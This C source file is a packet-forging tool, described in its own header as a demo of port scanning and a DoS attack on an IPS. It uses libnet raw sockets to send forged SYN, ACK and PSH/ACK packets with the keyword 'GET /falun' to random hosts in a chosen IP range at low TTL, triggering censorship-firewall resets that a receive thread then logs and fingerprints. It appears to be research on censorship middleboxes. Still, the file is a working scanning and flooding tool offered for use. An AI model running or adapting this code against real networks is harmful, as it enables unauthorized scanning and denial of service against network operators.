#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <glib.h>
#include <libnet.h>
#include <time.h>

#define _NAME "scan"
#define _DESCR "A demo of port scan and packet forging DoS attack of IPS"
#define _VERSION "0.0.1"
#define _DATE "Aug 24 2009"
#define _COPYING "Copyright (c) 2009, KLZ-grad. License: BSD."

guint mtu = 1492;
guint ttl = 0; //don't make ttl large enough to reach its destination
char* dst_range = NULL;
char* _myip = NULL;
gboolean version;
GOptionEntry gopts[] = {
	{"mtu", 'm', 0, G_OPTION_ARG_INT, &mtu, 
		"MTU (1492)", NULL},
	{"ttl", 't', 0, G_OPTION_ARG_INT, &ttl, 
		"initial ttl (required)", NULL},
	{"dst-range", 'd', 0, G_OPTION_ARG_STRING, &dst_range, 
		"destinations in CIDR (3.0.0.0/8)", NULL},
	{"source", 's', 0, G_OPTION_ARG_STRING, &_myip, 
		"my ip (auto-selected)", NULL},
	{"version", 'V', 0, G_OPTION_ARG_NONE, &version, 
		"Print version info and exit", NULL},
	{NULL, 0, 0, 0, NULL, NULL, NULL}
};

gulong dsthost;
guchar dstnet;
gulong myip;
gushort dport;
gboolean _continue;
gboolean recv_continue;

struct {
	gushort sport;
	gulong seq;
	gulong daddr;
	GTimeVal time;
} scan[65536];

#define RAND() ((unsigned long)mrand48())
#define offset(cidr) (0xffffffffL >> (cidr))
#define netname offset
#define netmask(cidr) (0xffffffffL << (32-(cidr)))
#define hostrand(host, cidr) \
	(((host) & netmask(cidr)) | (RAND() & netname(cidr)))
#define hostnext(host, cidr) \
	(((host) & netmask(cidr)) | ((host)+1 & netname(cidr)))

char errbuf[LIBNET_ERRBUF_SIZE];
libnet_t* l;
libnet_ptag_t tcp;
libnet_ptag_t ip;

void print_packet(const struct libnet_ipv4_hdr* iph,
								 const struct libnet_tcp_hdr* tcph,
								 const GTimeVal* now){
	gushort dp = ntohs(tcph->th_dport);
	GTimeVal elap;
	elap.tv_sec = now->tv_sec - scan[dp].time.tv_sec;
	elap.tv_usec = now->tv_usec - scan[dp].time.tv_usec;
	if(elap.tv_usec < 0){
		elap.tv_usec += 1000000;
		elap.tv_sec --;
	}
	printf("[%ld.%06ld] +%ld.%06ld ", 
			scan[dp].time.tv_sec, scan[dp].time.tv_usec, elap.tv_sec, elap.tv_usec);
	
	int first = 1;
#define PRINTFLAG(f) \
if(tcph->th_flags & TH_##f){\
	if(!first)putchar('/');\
	printf(#f);\
	first=0;\
}
	PRINTFLAG(FIN)
	PRINTFLAG(SYN)
	PRINTFLAG(RST)
	PRINTFLAG(PUSH)
	PRINTFLAG(ACK)
	PRINTFLAG(URG)
	PRINTFLAG(ECE)
	PRINTFLAG(CWR)
	
	printf(" %hu>%hu ttl:%hhu id:%04x w:%04x",
		ntohs(tcph->th_sport), dp,
		iph->ip_ttl, ntohs(iph->ip_id), ntohs(tcph->th_win));
		
#ifdef CHINANET
/*
The following patterns are observed in a ChinaNet node,
but they may be not true in other networks.
*/
	if(tcph->th_flags == (TH_RST|TH_ACK)){
		//ttl diff
		printf(" td:%d", iph->ip_ttl - ntohs(tcph->th_win)%64);
		//this is a rather strong pattern, so make it a assertion
		if((gushort)(-1 - ntohs(tcph->th_win)*13) != ntohs(iph->ip_id))
			printf(" ; assertion failed: `ip_id == -1-th_win*13`");
	}
#endif
	if(tcph->th_off != 5)
		printf(" ; assertion failed: `tcph->th_doff != 5`");
	putchar('\n');
}

gpointer recv_thread(gpointer _){
	//g_debug("recv: start");
	int s = socket(PF_INET, SOCK_RAW, IPPROTO_TCP);
	if(s == -1){
		g_critical("recv: socket: %s", strerror(errno));
		return _;
	}

#define RCVBUF (LIBNET_IPV4_H + LIBNET_TCP_H)
	char buf[RCVBUF];
	struct libnet_ipv4_hdr* iph = (struct libnet_ipv4_hdr*)buf;
	struct libnet_tcp_hdr* tcph = (struct libnet_tcp_hdr*)(buf + LIBNET_IPV4_H);

	for(recv_continue = TRUE; recv_continue; ){
		guint n;
		GTimeVal now;
		n = read(s, buf, RCVBUF);
		g_get_current_time(&now);
		if(!recv_continue)break;
		if(n < RCVBUF){
			g_warning("recv: read: %s", errno ? strerror(errno) : "Not enough");
			continue;
		}
		if(iph->ip_p != IPPROTO_TCP || iph->ip_dst.s_addr != myip)
			continue;
		
		gushort sp = ntohs(tcph->th_sport);
		if(myip != iph->ip_dst.s_addr
		|| scan[sp].daddr != iph->ip_src.s_addr
		|| scan[sp].sport != ntohs(tcph->th_dport)
		|| (ntohl(tcph->th_seq) - scan[sp].seq)%1460 != 0
		|| !(tcph->th_flags & TH_RST)){
			continue;
		}

		print_packet(iph, tcph, &now);
	}

	close(s);
	
	//g_debug("recv: return");
	return _;
}

void falun(){
	char plbuf[]="GET /falun HTTP/1.1\r\nHost: \r\n";
	int pl_s = strlen(plbuf);
	gulong sa = myip;
	gulong da = htonl(hostrand(dsthost, dstnet));
	gushort sp = RAND()%65535+1;
	gushort dp = dport;
	gushort win = RAND()%65536;
	gulong seq = RAND();
	gulong ack = RAND();
	scan[dport].sport = sp;
	scan[dport].daddr = da;
	scan[dport].seq = ack;

	//syn
	tcp = libnet_build_tcp(sp, dp, seq++, 0, TH_SYN, win, 0, 0, 
												LIBNET_TCP_H, NULL, 0, l, tcp);
	ip = libnet_build_ipv4(LIBNET_IPV4_H + LIBNET_TCP_H, 0, 0, 
												IP_DF, ttl, IPPROTO_TCP, 0, sa, da, NULL, 0, l, ip);
	if(-1 == libnet_write(l)){
		g_warning("libnet_write: %s\n", libnet_geterror(l));
		return;
	}

	//ack WITHOUT SYN/ACK!
	tcp = libnet_build_tcp(sp, dp, seq, ack, TH_ACK, win, 0, 0, 
												LIBNET_TCP_H, NULL, 0, l, tcp);
	ip = libnet_build_ipv4(LIBNET_IPV4_H + LIBNET_TCP_H, 0, 0, 
												IP_DF, ttl, IPPROTO_TCP, 0, sa, da, NULL, 0, l, ip);
	if(-1 == libnet_write(l)){
		g_warning("libnet_write: %s\n", libnet_geterror(l));
		return;
	}

	//psh/ack
	tcp = libnet_build_tcp(sp, dp, seq, ack, TH_PUSH|TH_ACK, win, 0, 0, 
												LIBNET_TCP_H + pl_s, plbuf, pl_s, l, tcp);
	ip = libnet_build_ipv4(LIBNET_IPV4_H + LIBNET_TCP_H + pl_s, 0, 0, 
												IP_DF, ttl, IPPROTO_TCP, 0, sa, da, NULL, 0, l, ip);

	struct timespec sd;
	clock_gettime(CLOCK_REALTIME, &sd);
	if(sd.tv_nsec < 500000000){
		sd.tv_nsec = 500000000;
	}else{
		sd.tv_nsec = 0;
		sd.tv_sec++;
	}
	clock_nanosleep(CLOCK_REALTIME, TIMER_ABSTIME, &sd, NULL);
	if(-1 == libnet_write(l)){
		g_warning("libnet_write: %s\n", libnet_geterror(l));
		return;
	}
	g_get_current_time(&scan[sp].time);
}

void sigh(int _){
	(void)_;
	_continue = FALSE;
}

int main(int argc, char** argv){
	g_thread_init(NULL);

	GTimeVal now;
	g_get_current_time(&now);
	srand48(now.tv_sec*now.tv_usec);
	
	GError* gerr = NULL;
	/* options parsing */
	GOptionContext* context = g_option_context_new(NULL);
	//g_option_context_set_summary(context, _DESCR);
	g_option_context_add_main_entries(context, gopts, NULL);
	if(!g_option_context_parse(context, &argc, &argv, &gerr))
		g_error("g_option_context_parse: %s", gerr->message);
	g_option_context_free(context);

	/* options setup */
	if(version){
		fprintf(stderr, "%s - %s\nVersion %s, %s\n%s\n",
						_NAME, _DESCR, _VERSION, _DATE, _COPYING);
		exit(0);
	}

	/* libnet init */
	l = libnet_init(LIBNET_RAW4, NULL, errbuf);
	if(l == NULL)
		g_error("libnet_init: %s\n", errbuf);


	if(_myip == NULL)
		myip = libnet_get_ipaddr4(l);
	else
		myip = inet_addr(_myip);
	if(dst_range == NULL){
		dsthost = 0x03000000;
		dstnet = 8;
	}else{
		char ip[16];
		if(2 != sscanf(dst_range, "%[.0-9]/%hhu", ip, &dstnet)
		|| 0xffffffffUL == (dsthost = ntohl(inet_addr(ip)))
		|| dstnet > 32)
			g_error("Invalid dst-range: %s", dst_range);
	}


	/* install signal handler */
	signal(SIGINT, sigh);
	signal(SIGQUIT, sigh);
	signal(SIGTERM, sigh);

	/* start recv thread */
	GThread* recvt = g_thread_create(recv_thread, NULL, TRUE, &gerr);
	if(NULL == recvt)
		g_error("g_thread_create: %s", gerr->message);

	/* main loop */
	for(_continue = TRUE; _continue; ){
		dport = dport%65535+1;
		falun();
	}

	/* cleanup */
	recv_continue = FALSE;
	/* read() blocks,
	 so in an easy way send a packet to make it return, */
	libnet_build_tcp(1, 1, 0, 0, 0, 0, 0, 0, LIBNET_TCP_H, NULL, 0, l, tcp);
	libnet_build_ipv4(LIBNET_IPV4_H + LIBNET_TCP_H, 0, 0, 0, 1, IPPROTO_TCP, 
										0, myip, myip, NULL, 0, l, ip);
	if(-1 == libnet_write(l))
		g_warning("cleanup: libnet_write: %s", libnet_geterror(l));
	g_thread_join(recvt);
	libnet_destroy(l);
	return 0;
}
